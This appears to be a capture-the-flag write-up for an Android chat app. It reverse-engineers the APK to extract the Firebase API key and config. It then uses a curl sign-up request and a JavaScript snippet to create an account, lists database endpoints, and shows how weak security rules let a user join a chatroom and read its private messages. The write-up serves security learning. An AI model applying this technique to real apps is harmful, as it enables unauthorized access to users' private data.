## Skills required: apk reverse engineering, firebase pentesting

In this challenge participants shall receive an `.apk` file of an instant messaging app.

The .apk file is not obfuscated and can be [reverse-engineered in many ways](https://book.hacktricks.xyz/mobile-pentesting/android-app-pentesting/apk-decompilers). I used [jadx and jadx-gui](https://github.com/skylot/jadx).

From `resources.arsc/res/values/strings.xml` or `resources/res/values/strings.xml`, you can see the strings used in the application, which [hopefully will contain interesting strings](https://book.hacktricks.xyz/mobile-pentesting/android-app-pentesting#basic-understanding-of-the-application-manifest.xml-strings.xml)

![jadx](../../_resources/edede87694e6e4366f2cb25cc9c05657.png)

We can also look at the various decompiled code to find out what the app can do.

- There's no sign up functionality, only log in.
- Users can join chatrooms, read their messages and send messages once logged in

We are not seeing many security measures on the app because they are (and supposed to be) managed by Firebase.

[It is therefore fine even if the application doesn't have sign up functionalities.](https://appsec-labs.com/portal/firebase-applications-the-untold-attack-surface/)

Sign up yourself with the API key by refering to 

https://cloud.google.com/identity-platform/docs/reference/rest/v1/accounts/signUp

OR

![eaa60e202d0f8b9bf236776cd5166425.png](../../_resources/eaa60e202d0f8b9bf236776cd5166425.png)

```
curl --request POST \
  --header "Content-Type: application/json" \
  --data '{"email": "user@example.com", "password": "myverysecurepassword"}' \
  "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=AIzaSyAS4ptyTHqvFh0tviMbWV9gzIr7bMo0eCY"
```

OR use the JavaScript interface:

```html
<script src="https://www.gstatic.com/firebasejs/7.15.5/firebase-app.js"></script>
<script src="https://www.gstatic.com/firebasejs/7.15.5/firebase-auth.js"></script>

<script>
    /*
    * Insert your target's application config in the firebaseConfig object below.
    * This information exists in the client-side and visible to everyone.
    */
const firebaseConfig = {
    apiKey: 'AIzaSyAS4ptyTHqvFh0tviMbWV9gzIr7bMo0eCY',
    authDomain: 'https://instantchat-66091-default-rtdb.firebaseio.com',
    databaseURL: 'https://instantchat-66091-default-rtdb.firebaseio.com',
    projectId: 'instantchat-66091'
};

app = firebase.initializeApp(firebaseConfig);
authService = firebase.auth();
authService.createUserWithEmailAndPassword('appsec@pwn.com', '123456789').then( creds => {
    console.log(`Account created (${creds.user.email})`);
}).catch(()=>{}).finally(()=>{
  return authService.signInWithEmailAndPassword('appsec@pwn.com', '123456789')
}).then(console.log);

</script>
```

Either way you can get the `idtoken`, which can be [appended](https://firebase.google.com/docs/database/rest/auth) to the [RESTful API calls](https://firebase.google.com/docs/reference/rest/database) to access the various resources.

There are 3 collections and 5 endpoints of interest obtainable from reverse engineering the APK:

```
messages
users
chatrooms

/messages/{CHATROOM_ID}
/users/
/users/{uid}/profile/
/chatrooms/
/chatrooms/{uuid}/chatroom
```

Access control can be tested manually. I used https://github.com/iosiro/baserunner but for beginners, even poking around in Burp Suite Repeater will do.

Use this config:

```json
{
  "apiKey": "AIzaSyAS4ptyTHqvFh0tviMbWV9gzIr7bMo0eCY",
  "authDomain": "instantchat-66091-default-rtdb.firebaseio.com",
  "databaseURL": "https://instantchat-66091-default-rtdb.firebaseio.com",
  "projectId": "instantchat-66091",
  "storageBucket": "instantchat-66091.appspot.com",
  "appId": "1:204796949431:android:8b3f79c75f2559c452ee32"
}
```

Add yourself to the participant of the chatroom:

![43c5a6fadaa0ceae8e0aa8d7c3df8649.png](../../_resources/43c5a6fadaa0ceae8e0aa8d7c3df8649.png)

And then read the chatroom messages:

![a95457ec96932e58c665c2a07df21636.png](../../_resources/a95457ec96932e58c665c2a07df21636.png)


For reference, the firebase security rule is as follows.

```json
{
  "rules": {
    ".write": false,
    ".read" : false,
    "users" : {
      ".read" : "auth != null",
      ".write" : "auth != null",
    },
    "chatrooms" : {
      ".read" : "auth != null",
      ".write" : "!data.exists() || !newData.exists() && auth != null",
      "$chatroomid":{
        "chatroom":{
          "participants":{
            ".write":"auth != null"
          }
        }

      }
    },
    "messages" : {
      "$messageid" : {
        ".read" : "root.child('chatrooms').child($messageid).child('chatroom').child('participants').child(auth.uid).exists()",
        "$timestamp":{
          ".write" : "!data.exists() || !newData.exists() && auth != null",
        }
      }
    }
  }
}
```
